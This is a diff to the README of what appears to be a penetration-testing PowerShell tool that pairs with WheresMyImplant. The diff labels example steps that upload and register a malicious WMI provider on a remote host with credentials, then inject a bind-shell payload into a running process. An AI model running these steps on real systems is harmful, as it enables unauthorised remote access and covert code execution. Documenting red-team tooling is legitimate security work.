@@ -49,22 +49,28 @@ Primarily used in conjunction with WheresMyImplant - https://github.com/0xbadjuj
 
 #### Example Run
 
+**Upload the provider to the target host** <br/>
 Invoke-WMIUpload -PayloadPath C:\WheresMyImplant.dll -PayloadName WheresMyImplant.dll -Destination C:\Windows\System32\wbem -ComputerName $ComputerName -Credential $Credential -Verbose
 
+**Register the provider on the target host** <br/>
 Install-WMIProviderExtention -LocalLibraryLocation C:\WheresMyImplant.dll -ComputerName $ComputerName -Credential $Credential -Verbose
 
+**Upload the payload to the target host** <br/>
 Invoke-WMIUpload -PayloadPath C:\bind64.exe -PayloadName bind64.exe -ComputerName $ComputerName -Credential $Credential -Inject -Verbose
 
+**Get the argumentlist order** <br/>
 (Get-WmiObject -List -Class Win32_Implant -ComputerName $ComputerName -Credential $Credential).Methods["InjectPeWMIFS"].InParameters
 
+**Find a process to inject into** <br/>
 Get-WmiObject Win32_Process | Select Name, ProcessId
 
+**Inject into process and run payload** <br/>
 Invoke-WmiMethod -Class Win32_Implant -Name InjectPeWMIFS -ArgumentList "bind64.exe", "", 4596, "WMIFS" -ComputerName $ComputerName -Credential $Credential
 
 ### Author, Contributors, and License
 
-Author: Alexander Leary (@0xbadjuju), NetSPI - 2017
+##### Author: Alexander Leary (@0xbadjuju), NetSPI - 2017
 
-License: BSD 3-Clause
+##### License: BSD 3-Clause
 
-Required Dependencies: None
+##### Required Dependencies: None
